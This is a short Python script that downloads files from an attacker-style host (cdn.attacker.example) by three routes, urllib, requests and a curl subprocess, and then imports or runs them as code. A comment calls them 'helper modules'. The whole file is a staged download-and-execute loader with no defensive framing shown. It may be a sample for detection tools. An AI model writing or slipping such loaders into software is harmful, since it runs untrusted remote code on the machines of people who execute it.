import importlib.util
import runpy
import subprocess
import urllib.request

import requests

HELPER_URL = 'https://cdn.attacker.example/net_helper.py'
STAGE_URL = 'https://cdn.attacker.example/stage_two.py'

# Fetch helper modules at run time, then load them
urllib.request.urlretrieve(HELPER_URL, 'net_helper.py')
import net_helper
with open('stage_two.py', 'wb') as handle:
    handle.write(requests.get(STAGE_URL).content)
spec = importlib.util.spec_from_file_location('stage_two', 'stage_two.py')
subprocess.run(['curl', '-o', '/tmp/stage_three.py', STAGE_URL], check=True)
runpy.run_path('/tmp/stage_three.py')
